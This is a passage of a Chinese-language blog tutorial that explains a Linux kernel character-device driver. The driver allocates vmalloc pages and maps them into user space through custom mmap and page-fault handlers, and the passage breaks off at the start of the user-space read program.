...</span><br><span class="line">    vmf.virtual_address = address &amp; PAGE_MASK; </span><br><span class="line">    vmf.pgoff = pgoff;                       </span><br><span class="line">    vmf.flags = flags;                       </span><br><span class="line">    vmf.page = <span class="literal">NULL</span>;       </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 如果虚拟内存管理区提供了 falut() 回调函数，那么将调用此函数来获取要映射的物理内存页，</span></span><br><span class="line">    <span class="comment">//    我们在 mmap() 系统调用的实现中看到，已经将其设置为 map_fault() 函数了。</span></span><br><span class="line">    <span class="comment">//    不同版本的 Linux 源码的该函数定义不一样，</span></span><br><span class="line">    <span class="comment">//    我们实现的在头文件中定义这样 vm_fault_t (*fault)(struct vm_fault *vmf);只有一个参数</span></span><br><span class="line">    <span class="keyword">if</span> (likely(vma-&gt;vm_ops-&gt;fault)) &#123;</span><br><span class="line">        ret = vma-&gt;vm_ops-&gt;fault(vma, &amp;vmf);</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (likely(pte_same(*page_table, orig_pte))) &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="comment">// 2. 通过物理内存页生成一个页表项值。</span></span><br><span class="line">        entry = mk_pte(page, vma-&gt;vm_page_prot);</span><br><span class="line">        <span class="keyword">if</span> (flags &amp; FAULT_FLAG_WRITE)</span><br><span class="line">            entry = maybe_mkwrite(pte_mkdirty(entry), vma);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 将虚拟内存地址映射到物理内存。</span></span><br><span class="line">        set_pte_at(mm, address, page_table, entry);</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​函数主要通过调用虚拟内存管理区结构（vma）的 <code>fault()</code> 回调函数（也就是我们后面需要自定义的函数）来获取到文件的页缓存。并将虚拟内存地址映射到页缓存的物理内存页（也就是将进程的页表项设置为上面生成的页表项的值）。铺垫完这些前置知识后，接下来我们就一起来看看模块的代码具体实现。</p><h1 id="代码流程分析"><a href="#代码流程分析" class="headerlink" title="代码流程分析"></a>代码流程分析</h1><h3 id="map-driver-c"><a href="#map-driver-c" class="headerlink" title="map_driver.c"></a>map_driver.c</h3><p>​首先来看看内核驱动模块的源代码文件，该文件的函数可以分成三部分，第一部分是模块注册和退出函数，第二部分是 file_operations 函数指针，第三部分便是 vm_operations_struct 的函数指针，下面我们将依次进行分析。</p><p>​首先是第一部分模块注册和退出函数，宏定义方面，<code>MAP_PAGE_COUNT</code>为我们想创建的10个页面，每个页面的大小<code>PAGE_SIZE</code>的宏可在<code>linux/pages.h</code>下找到，<code>MAP_DEV_NAME</code> 为设备名，设备号我们采用动态分配。接下来的几个字段均和设备有关，定义于<code>linux/cdev.h</code>和<code>linux/divice.h</code>中。</p><p>​<code>struct file_operations</code>结构体定义在<code>linux/fs.h</code>下，它是 fs_struct 的一个成员，用来存放可对文件执行的函数操作指针，而<code>struct vm_operations_struct</code>在<code>linux/mm.h</code>下，它是 mm_struct 的一个成员，表示可对 vma 执行的函数操作指针。最后的<code>static char *vmalloc_area = NULL;</code>我们在后面会用到，用来记录分配的页面逻辑地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAP_PAGE_COUNT 10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAP_LEN (PAGE_SIZE * MAP_PAGE_COUNT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAP_DEV_NAME <span class="string">&quot;mmap_dirver_dev&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">dev_t</span> devid;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cdev</span> <span class="title">map_dev</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="keyword">class</span> *<span class="title">my_class</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">my_device</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* struct file_operations handler */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">mapdrv_mmap</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="keyword">struct</span> vm_area_struct *vma)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">mapdrv_open</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *file)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* struct vm_operations_struct handler */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">map_vopen</span><span class="params">(<span class="keyword">struct</span> vm_area_struct *vma)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">map_vclose</span><span class="params">(<span class="keyword">struct</span> vm_area_struct *vma)</span>;</span><br><span class="line"><span class="type">vm_fault_t</span> <span class="title function_">map_fault</span><span class="params">(<span class="keyword">struct</span> vm_fault *vmf)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">mapdrvo_fops</span> =</span> &#123;</span><br><span class="line">    .owner = THIS_MODULE,</span><br><span class="line">    .mmap = mapdrv_mmap,</span><br><span class="line">    .open = mapdrv_open,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">vm_operations_struct</span> <span class="title">map_vm_ops</span> =</span> &#123;</span><br><span class="line">    .open = map_vopen,</span><br><span class="line">    .close = map_vclose,</span><br><span class="line">    .fault = map_fault,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *vmalloc_area = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);<span class="comment">// 证书</span></span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;sqq&quot;</span>);<span class="comment">// 作者</span></span><br></pre></td></tr></table></figure><p>​模块加载函数需要完成两件事，其一为设备注册，我们使用动态申请设备号的注册方法，具体流程是 <code>register_chrdev_region()</code> 动态申请该设备号，<code>cdev_init()</code> 用于初始化 cedv 结构体，<code>cdev_add()</code> 用于添加一个字符设备到操作系统，<code>class_create()</code> 用于自动创建类和设备节点，这样我们就不必手动在 <code>/dev</code> 下创建设备文件了。这部分其实是一个单独的话题，设备驱动开发，因为我现在对其也不是特别了解，调试也花了不少时间，其中涉及到很多结构体关联，感兴趣可以自己去深入研究一下~</p><p>​其二为页面的申请，我们使用 <code>vmalloc()</code>函数进行页面的申请，然后在循环里，为每个物理页框<code>SetPageReserved()</code>置位，通过设置 Page 结构的 flag 成员变量，将 reserved 位置1，来将页框的属性设为占用，避免操作系统回收。而<code>struct page *vmalloc_to_page(const void *addr)</code>函数则是通过逻辑地址 addr 来寻找其物理页框的函数。为了方便观察，我们在每个页面内填充内容<code>&quot;Page%d initialize...&quot;</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">mapdrv_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> ret = alloc_chrdev_region(&amp;devid, <span class="number">0</span>, <span class="number">1</span>, MAP_DEV_NAME);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        printk(KERN_ALERT <span class="string">&quot;alloc_chrdev_region is failed.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cdev_init(&amp;map_dev, &amp;mapdrvo_fops);</span><br><span class="line">    ret = cdev_add(&amp;map_dev, devid, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        unregister_chrdev_region(devid, <span class="number">1</span>);</span><br><span class="line">        cdev_del(&amp;map_dev);</span><br><span class="line">        printk(KERN_ALERT <span class="string">&quot;Add dev is failed.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    my_class = class_create(THIS_MODULE, MAP_DEV_NAME);</span><br><span class="line">    <span class="keyword">if</span> (!my_class)</span><br><span class="line">    &#123;</span><br><span class="line">        unregister_chrdev_region(devid, <span class="number">1</span>);</span><br><span class="line">        cdev_del(&amp;map_dev);</span><br><span class="line">        printk(KERN_ALERT <span class="string">&quot;create calss failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    my_device = device_create(my_class, <span class="literal">NULL</span>, devid, <span class="literal">NULL</span>, MAP_DEV_NAME);</span><br><span class="line">    <span class="keyword">if</span> (!my_device)</span><br><span class="line">    &#123;</span><br><span class="line">        printk(KERN_ALERT <span class="string">&quot;create device failed\n&quot;</span>);</span><br><span class="line">        unregister_chrdev_region(devid, <span class="number">1</span>);</span><br><span class="line">        cdev_del(&amp;map_dev);</span><br><span class="line">        class_destroy(my_class);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;chrdev[id:%d %d] register successfull!\n&quot;</span>, MAJOR(devid), MINOR(devid));</span><br><span class="line"></span><br><span class="line">    vmalloc_area = vmalloc(MAP_LEN);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> virt_addr = (<span class="type">unsigned</span> <span class="type">long</span>)vmalloc_area;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; virt_addr &lt; (<span class="type">unsigned</span> <span class="type">long</span>)vmalloc_area + MAP_LEN; virt_addr += PAGE_SIZE)</span><br><span class="line">    &#123;</span><br><span class="line">        SetPageReserved(vmalloc_to_page((<span class="type">void</span> *)virt_addr));</span><br><span class="line">        <span class="built_in">sprintf</span>((<span class="type">char</span> *)virt_addr, <span class="string">&quot;Page%d initialize...&quot;</span>, i++);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* printk(&quot;vmalloc_area at 0x%lx (phys 0x%lx)\n&quot;,</span></span><br><span class="line"><span class="comment">    (unsigned long)vmalloc_area,(unsigned long)vmalloc_to_pfn((void *)vmalloc_area) &lt;&lt; PAGE_SHIFT);  */</span></span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;map_driver module init!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​模块退出函数与之相反，物理页面标记为可释放，并 vfree 掉虚拟地址，最后注销掉相关类和设备。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">mapdrv_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* unreserve all pages */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">long</span> virt_addr = (<span class="type">unsigned</span> <span class="type">long</span>)vmalloc_area; virt_addr &lt; (<span class="type">unsigned</span> <span class="type">long</span>)vmalloc_area + MAP_LEN; virt_addr += PAGE_SIZE)</span><br><span class="line">        ClearPageReserved(vmalloc_to_page((<span class="type">void</span> *)virt_addr));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (vmalloc_area)</span><br><span class="line">        vfree(vmalloc_area);</span><br><span class="line"></span><br><span class="line">    unregister_chrdev_region(devid, <span class="number">1</span>);</span><br><span class="line">    cdev_del(&amp;map_dev);</span><br><span class="line">    device_del(my_device);</span><br><span class="line">    class_destroy(my_class);</span><br><span class="line"></span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;delete device /sys/class/%s \n&quot;</span>,MAP_DEV_NAME);</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;delete device /dev/%s\n&quot;</span>, MAP_DEV_NAME);</span><br><span class="line"></span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;map_driver module exit!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​第二部分就是涉及到和 mmap() 函数相关的东西了，我们前面提到，在用户态的 mmap 函数进入到 mmap_region 函数里的这一句 <code>error = file-&gt;f_op-&gt;mmap(file, vma);</code>时，便是该进入我们 <code>struct file_operations mapdrvo_fops </code>结构体里自定义的 mmap 函数里执行了。接下来看看相关代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">static struct file_operations mapdrvo_fops = &#123;</span></span><br><span class="line"><span class="comment">    .owner = THIS_MODULE,</span></span><br><span class="line"><span class="comment">    .mmap = mapdrv_mmap,</span></span><br><span class="line"><span class="comment">    .open = mapdrv_open,</span></span><br><span class="line"><span class="comment">&#125;;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">mapdrv_mmap</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="keyword">struct</span> vm_area_struct *vma)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> offset = vma-&gt;vm_pgoff &lt;&lt; PAGE_SHIFT;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> size = vma-&gt;vm_end - vma-&gt;vm_start;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size &gt; MAP_LEN)</span><br><span class="line">    &#123;</span><br><span class="line">        printk(KERN_ALERT <span class="string">&quot;Size too big\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> -ENXIO;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*  写进程的 vma 区域必须是可共享的 */</span></span><br><span class="line">    <span class="keyword">if</span> ((vma-&gt;vm_flags &amp; VM_WRITE) &amp;&amp; !(vma-&gt;vm_flags &amp; VM_SHARED))</span><br><span class="line">    &#123;</span><br><span class="line">        printk(KERN_ALERT <span class="string">&quot;Writeable mappings can not be privated!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* 锁住物理页框，防止被换出 */</span></span><br><span class="line">    vma-&gt;vm_flags |= VM_LOCKONFAULT;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (offset == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 核心代码，设置对 mmap 区域的处理方法。</span></span><br><span class="line">        vma-&gt;vm_ops = &amp;map_vm_ops;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        printk(<span class="string">&quot;offset out of range\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> -ENXIO;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​核心代码便是<code>vma-&gt;vm_ops = &amp;map_vm_ops;</code>，通过设置该域对 mmap 区域的处理方法，包括后续我们所说的缺页中断的处理函数，以方便进程在实际读写时调用该方法函数。对了，我们还定义了 open 函数，来看看吧，该函数主要就打印一下主调进程的信息方便记录一下日志。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">mapdrv_open</span><span class="params">(<span class="keyword">struct</span> inode *inoe, <span class="keyword">struct</span> file *file)</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(<span class="string">&quot;process[id: %d]: %s is mapping...\n&quot;</span>, current-&gt;pid, current-&gt;comm);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​接下来就是我们的第三部分，对应<code>struct vm_operations_struct map_vm_ops</code>里，我们完成了对虚拟内存的这三个操作的函数体实现。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* &lt;linux.mm.h&gt;  --这是内核源码中对 struct vm_operations_struct 的注释</span></span><br><span class="line"><span class="comment"> * These are the virtual MM functions - opening of an area, closing and</span></span><br><span class="line"><span class="comment"> * unmapping it (needed to keep files on disk up-to-date etc), pointer</span></span><br><span class="line"><span class="comment"> * to the functions called when a no-page or a wp-page exception occurs. </span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p>​首先来看看<code>vm_fault_t map_fault(struct vm_fault *vmf)</code>函数，其参数为<code>struct vm_fault</code>结构体，其定义于<code>linux/mm.h</code>，用于描述缺页相关页面参数。<code>struct vm_area_struct *vma;</code>就指向其所在线性映射区的 VAM，<code>unsigned long address;</code>即产生缺页的地址（注意：是进程空间中的逻辑地址），<code>*pmd, *pud, orig_pte </code>是一些页目录项和页表项，还有最重要的一项，就是<code>struct page *page;</code>，这就是需要建立的物理页框的结构体指针，需要指向对应页框的物理地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vm_fault</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vma</span>;</span><span class="comment">/* Target VMA */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> flags;<span class="comment">/* FAULT_FLAG_xxx flags */</span></span><br><span class="line"><span class="type">gfp_t</span> gfp_mask;<span class="comment">/* gfp mask to be used for allocations */</span></span><br><span class="line"><span class="type">pgoff_t</span> pgoff;<span class="comment">/* Logical page offset based on vma */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> address;<span class="comment">/* Faulting virtual address */</span></span><br><span class="line"><span class="type">pmd_t</span> *pmd;<span class="comment">/* Pointer to pmd entry matching</span></span><br><span class="line"><span class="comment"> * the &#x27;address&#x27; */</span></span><br><span class="line"><span class="type">pud_t</span> *pud;<span class="comment">/* Pointer to pud entry matching</span></span><br><span class="line"><span class="comment"> * the &#x27;address&#x27;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">pte_t</span> orig_pte;<span class="comment">/* Value of PTE at the time of fault */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">cow_page</span>;</span><span class="comment">/* Page handler may use for COW fault */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mem_cgroup</span> *<span class="title">memcg</span>;</span><span class="comment">/* Cgroup cow_page belongs to */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span><span class="comment">/* -&gt;fault handlers should return a</span></span><br><span class="line"><span class="comment"> * page here, unless VM_FAULT_NOPAGE</span></span><br><span class="line"><span class="comment"> * is set (which is also implied by</span></span><br><span class="line"><span class="comment"> * VM_FAULT_ERROR).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>​下面来看看我们的<code>vm_fault_t map_fault(struct vm_fault *vmf)</code>函数的具体实现。</p><blockquote><p> 请注意该函数的目的是：将页在内核空间中的线性（逻辑）地址所对应的物理地址映射到进程用户空间的某线性（逻辑）地址中，而不是申请物理页框，物理页框在之前缺页流程中已经申请好了！请仔细揣摩一下这段话。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* page fault handler */</span></span><br><span class="line"><span class="type">vm_fault_t</span> <span class="title function_">map_fault</span><span class="params">(<span class="keyword">struct</span> vm_fault *vmf)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> offset, kernel_virt_addr, phy_addr;</span><br><span class="line">    offset = vmf-&gt;address - vmf-&gt;vma-&gt;vm_start;</span><br><span class="line">    kernel_virt_addr = (<span class="type">unsigned</span> <span class="type">long</span>)vmalloc_area + (<span class="type">unsigned</span> <span class="type">long</span>)(vmf-&gt;pgoff &lt;&lt; PAGE_SHIFT);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 错误检查</span></span><br><span class="line">    <span class="keyword">if</span> ((vmf-&gt;vma == <span class="literal">NULL</span>) || (vmalloc_area == <span class="literal">NULL</span>) || (offset &gt;= MAP_LEN))</span><br><span class="line">    &#123;</span><br><span class="line">        printk(<span class="string">&quot;return VM_FAULT_SIGBUS!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> VM_FAULT_SIGBUS;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    phy_addr = (<span class="type">unsigned</span> <span class="type">long</span>)vmalloc_to_pfn((<span class="type">void</span> *)kernel_virt_addr) &lt;&lt; PAGE_SHIFT;</span><br><span class="line">    page = vmalloc_to_page((<span class="type">void</span> *)kernel_virt_addr);</span><br><span class="line">    </span><br><span class="line">    get_page(page);</span><br><span class="line">    vmf-&gt;page = page;</span><br><span class="line"></span><br><span class="line">    printk(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    printk(<span class="string">&quot;%s: map ker_virt_addr:0x%lx (phy_addr:0x%016lx) to usr_virt_addr:0x%lx , size: 0x%lx, page:%ld \n&quot;</span>,</span><br><span class="line">           __func__, kernel_virt_addr, phy_addr, vmf-&gt;address, PAGE_SIZE, vmf-&gt;pgoff);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>vmf-&gt;address，vmalloc_area，vmf-&gt;pgoff</code>：之前有提到，<code>vmf-&gt;address</code>表示该缺页在用户空间的逻辑地址。<code>vmalloc_area</code>是全局变量，在模块初始化函数里赋值的，表示页面在内核空间中的逻辑地址。<code>vmf-&gt;pgoff</code>则表示该缺页的编号，通常是0，1，2…。</li><li><code>unsigned long offset, kernel_virt_addr, phy_addr;</code>：<code>offset</code>字段表示该缺页与所在 VMA 起始地址的偏移，由于申请的页面大小为4096，因此该 <code>offset</code>的值通常是0，4096，8192…，<code>kernel_virt_addr</code>表示页在内核空间中的线性地址，<code>phy_addr</code>表示页框的物理地址。</li><li><code>phy_addr = (unsigned long)vmalloc_to_pfn((void *)kernel_virt_addr) &lt;&lt; PAGE_SHIFT;</code>：<code>vmalloc_to_pfn</code>函数可通过内核空间线性地址找到对应页的物理页框号并返回，而物理页框左移<code>PAGE_SHIFT</code>位便是我们要寻找的物理地址。</li><li><code>page = vmalloc_to_page((void *)kernel_virt_addr);</code>：该函数可通过内核空间线性地址返回对应页框的页描述符指针。</li><li><code>get_page(page);</code>：该函数用于该物理页框的引用计数 +1。</li><li><code>vmf-&gt;page = page;</code>：这个语句便是我们关键的动作了，将 vmf 结构体的 page 字段指向物理页框的描述符，便完成了映射过程。</li></ul><p>​最后，再来看看 open 和 close 的函数实现，这很简单啦，只是为了写个日志。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* open handler for vm area */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">map_vopen</span><span class="params">(<span class="keyword">struct</span> vm_area_struct *vma)</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(<span class="string">&quot;mapping vma is opened..\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* close handler form vm area */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">map_vclose</span><span class="params">(<span class="keyword">struct</span> vm_area_struct *vma)</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(<span class="string">&quot;mapping vma is closed..\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​到这里我们的故事终于就要结束了，太不容易了。</p><h3 id="maptest-read-c"><a href="#maptest-read-c" class="headerlink" title="maptest_read.c"></a>maptest_read.c</h3><p>​下面是我们用户空间的读程序。mmap 参数：可读，私有，加锁（防止被换出）。 mmap 返回的自然是用户空间的线性地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 